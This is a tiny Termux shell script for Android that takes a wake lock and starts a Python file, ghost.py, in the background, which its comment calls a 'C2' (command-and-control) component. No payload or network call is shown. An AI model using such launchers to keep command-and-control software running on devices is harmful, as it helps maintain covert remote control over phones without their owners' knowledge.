#!/data/data/com.termux/files/usr/bin/sh
# Keep the CPU awake
termux-wake-lock
# Run the Python C2 in the background
python3 /data/data/com.termux/files/home/ghost.py &
